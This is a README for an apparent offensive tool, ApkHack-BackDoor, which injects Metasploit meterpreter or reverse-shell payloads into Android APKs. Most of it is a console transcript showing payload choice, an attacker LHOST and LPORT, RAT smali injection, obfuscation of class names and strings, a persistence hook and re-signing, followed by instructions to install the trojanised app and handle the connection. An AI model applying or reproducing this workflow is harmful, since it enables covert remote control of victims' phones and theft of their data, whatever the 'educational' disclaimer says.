# ApkHack-BackDoor
ApkHack-BackDoor is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of any Linux distribution, Bash, Metasploit, Apktool, the Android SDK, smali, etc. This shell script is provided as-is without warranty of any kind and is intended for only educational purposes.

Usage:

```
root@parrot:~/Code/script/ApkHack-BackDoor/ApkHack-BackDoor# ./ApkHack-BackDoor.sh DarkHub.apk 
	    _    ____  _  __  _   _    _    ____ _  __
	   / \  |  _ \| |/ / | | | |  / \  / ___| |/ /
	  / _ \ | |_) | ' /  | |_| | / _ \| |   | ' / 
	 / ___ \|  __/| . \  |  _  |/ ___ \ |___| . \ 
	/_/   \_\_|   |_|\_\ |_| |_/_/   \_\____|_|\_\
								BitWalls-ops DarkHub
       

[*] Running ApkHack-BackDoor.sh v2.0.4a on Tue May 9 17:13:37 EDT 2023
[+] Android payload options:
1) meterpreter/reverse_http   4) shell/reverse_http
2) meterpreter/reverse_https  5) shell/reverse_https
3) meterpreter/reverse_tcp    6) shell/reverse_tcp
[?] Please select an Android payload option: 2
[?] Please enter an LHOST value: 107.4.9.31
[?] Please enter an LPORT value: 8080
[+] Android manifest permission options:
1) Keep original
2) Merge with payload and shuffle
[?] Please select an Android manifest permission option: 2
[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc
[*] Decompiling original APK file...done.
[*] Locating smali file to hook in original project...done.
[+] Package where RAT smali files will be injected: com/baidu/browser/inter
[+] Smali file to hook RAT payload: com/dark/hub/inter/BdApplication.smali
[*] Generating RAT APK file...done.
[*] Decompiling RAT APK file...done.
[*] Merging permissions of original and payload projects...done.
[*] Injecting helpful Java classes in RAT APK file...done.
[*] Creating new directory in original package for RAT smali files...done.
[+] Inject package path: com/baidu/browser/inter/pjese
[+] Generated new smali class name for MainBroadcastReceiver.smali: Iivym
[+] Generated new smali class name for MainService.smali: Aupyx
[+] Generated new smali class name for Payload.smali: Nwiuc
[+] Generated new smali class name for StringObfuscator.smali: Abnrw
[+] Generated new smali method name for StringObfuscator.obfuscate method: icobf
[+] Generated new smali method name for StringObfuscator.unobfuscate method: wbcik
[*] Copying RAT smali files to new directories in original project...done.
[*] Fixing RAT smali files...done.
[*] Obfuscating const-string values in RAT smali files...done.
[*] Adding hook in original smali file...done.
[*] Adding persistence hook in original project...done.
[*] Recompiling original project with backdoor...done.
[*] Generating RSA key for signing...done.
[*] Signing recompiled APK...done.
[*] Verifying signed artifacts...done.
[*] Aligning recompiled APK...done.
root@parrot:~/Code/script/ApkHack-BackDoor/ApkHack-BackDoor#
```

The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection via the generated resource script: msfconsole -r backdoor-apk.rc
